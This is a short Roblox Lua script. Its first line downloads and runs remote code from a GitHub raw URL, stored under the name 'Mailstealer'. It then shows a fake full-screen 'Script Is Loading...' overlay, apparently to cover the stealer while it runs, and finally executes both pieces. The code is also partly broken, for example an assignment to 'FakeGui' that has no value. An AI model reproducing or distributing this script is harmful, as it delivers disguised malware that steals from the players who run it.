getgenv().Mailstealer = loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/6f118714b1ad955357e44340.lua'))()

getgenv().FakeGui =-- Create the loading screen UI
local player = game.Players.LocalPlayer
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LoadingScreen"
screenGui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(1, 0, 1, 0)  -- Fullscreen size
frame.Position = UDim2.new(0, 0, 0, 0)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)  -- Black background
frame.BackgroundTransparency = 0.5
frame.Parent = screenGui

local loadingLabel = Instance.new("TextLabel")
loadingLabel.Text = "Script Is Loading..."
loadingLabel.Font = Enum.Font.SourceSansBold
loadingLabel.TextSize = 50
loadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingLabel.Size = UDim2.new(0, 400, 0, 50)
loadingLabel.Position = UDim2.new(0.5, -200, 0.5, -25)  -- Centered text
loadingLabel.BackgroundTransparency = 1  -- No background
loadingLabel.Parent = frame

-- Optional: Add a simple "loading" animation
local function animateLoading()
    while true do
        loadingLabel.Text = "Script Is Loading."
        wait(0.5)
        loadingLabel.Text = "Script Is Loading.."
        wait(0.5)
        loadingLabel.Text = "Script Is Loading..."
        wait(0.5)
    end
end

-- Start the loading animation
coroutine.wrap(animateLoading)()

-- Wait until the game is fully loaded
game.Loaded:Wait()  -- Wait until everything is loaded

-- After the game is loaded, remove the loading screen
screenGui:Destroy()

local function loadstring(script)
    local func, err = load(script)
    if not func then
        error(err)
    else
        func()
    end
end
loadstring(getgenv().Mailstealer)
loadstring(getgenv().FakeGui)
